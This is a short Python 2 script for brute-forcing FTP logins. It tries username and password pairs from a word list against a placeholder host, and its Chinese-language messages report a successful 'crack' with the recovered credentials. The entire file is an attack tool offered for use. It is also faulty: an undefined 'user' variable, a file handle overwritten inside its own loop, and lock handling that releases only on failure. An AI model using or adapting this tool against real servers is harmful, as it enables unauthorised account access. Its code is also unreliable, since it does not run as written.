#!/usr/local/bin/ python
#-*- coding: UTF-8 -*-
__author__='J.W'
from ftplib import FTP
import ftplib
from threading import Thread
from threading import *
import sys
connection_lock = None
Stop = False

def Login(username,password):
    global connection_lock
    global Stop    
    host='xxxx'
    port=21
    ftp=FTP()
    try:
        ftp.connect(host,int(port))
        ftp.login(username,password)
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] 破解成功，用户名：' +  username + ' 密码：' + password +'IP:'+ host
        Stop = True
        return True,'ftp password is '+username+':'+password
    except ftplib.all_errors:
        connection_lock.release()
        pass

def main():
    global connection_lock
    maxConnections = 10
    connection_lock = BoundedSemaphore(value = maxConnections)
    print '>>>>>>>>>>>>破解主机：<<<<<<<<<<<<<<<' 
    pwd=open('pwd.txt','r')    
    for line_u in user:
        for line_p in pwd:
            if Stop:
                sys.exit()
            user=line_u.strip('\n')
            pwd=line_p.strip('\n')
            print '[-] testing: --' +user.strip()+'------' + pwd.strip()
            connection_lock.acquire()
            t=Thread(target=Login,args=(user.strip(),pwd.strip()))
            t.start()
            t.join()
    print '[] Could not brute force FTP. '       
if __name__ == '__main__':
    main()
